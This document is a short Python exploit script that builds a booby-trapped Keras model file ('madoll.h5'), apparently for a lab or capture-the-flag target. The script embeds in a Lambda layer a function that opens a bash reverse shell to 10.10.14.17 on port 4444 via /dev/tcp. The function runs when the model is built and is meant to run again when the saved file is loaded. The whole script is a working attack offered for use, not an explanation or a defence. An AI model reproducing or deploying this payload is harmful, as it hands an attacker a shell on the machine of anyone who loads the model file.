#!/usr/bin/env python
import tensorflow as tf
import os

os.environ['TF_CPP_MIN_LOG_LEVEL'] = '3'
mal_file_name = 'madoll.h5'
ip = '10.10.14.17'
port = '4444'

def main(m):
    os.system("bash -i >& /dev/tcp/{}/{} 0>&1".format(ip, port))
    return m
try:
    print("[+] Creating malicious model...")
    model = tf.keras.Sequential()
    model.add(tf.keras.layers.Input(shape=(64,)))
    model.add(tf.keras.layers.Lambda(main))
    model.compile()
    print('[+] Compiling complete!')
    model.save(mal_file_name)
    print("[+] Saved to", mal_file_name)
except Exception as e:
    print("[-] Error creating model:", e)
    exit(1)